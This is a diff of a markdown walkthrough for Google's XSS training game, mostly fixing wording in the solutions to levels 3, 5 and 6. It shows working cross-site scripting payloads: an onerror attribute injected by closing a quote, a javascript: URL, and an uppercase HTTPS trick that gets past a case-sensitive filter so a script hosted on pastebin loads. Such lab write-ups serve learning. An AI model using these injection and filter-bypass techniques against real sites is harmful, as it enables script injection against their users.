@@ -35,7 +35,7 @@ There was a vulnerable image tag where I could inject my own code into the ```on
 ```
 
 #### Level 3:
-The page used the ```num``` parameter passed in to get the image.  If you close off the quote early similar to a sql injection, you can then put your own code after.  I used ```onerror``` function from the last challenge to input the alert.
+The page used the ```num``` parameter passed in to get the image.  If you close off the quote early similar to a sql injection, you can then put your own code after.  I used the ```onerror``` function from the last challenge to input the alert.
 
 ```
 https://xss-game.appspot.com/level3/frame#1' onerror='alert("hi")'
@@ -55,7 +55,7 @@ Inject:
 ```
 
 #### Level 5:
-There is a ```next``` parameter in the url that is used as the target for the ```a href```.  You can call javascript from within an a tag by using ```javascript:```.  After you inject the code below, type in an email and hit next.
+There is a ```next``` parameter in the url that is used as the target for the ```a href```.  You can call javascript from within an ```a``` tag by using ```javascript:```.  After you inject the code below, type in an email and hit next.
 
 ```html
 https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("hi")
@@ -71,7 +71,7 @@ if (url.match(/^https?:\/\//)) {
 
 url:
 ```
-https://xss-game.appspot.com/level6/frame#http://pastebin.com/raw/5m3aMjSK
+https://xss-game.appspot.com/level6/frame#HTTPS://pastebin.com/raw/5m3aMjSK
 ```
 
 
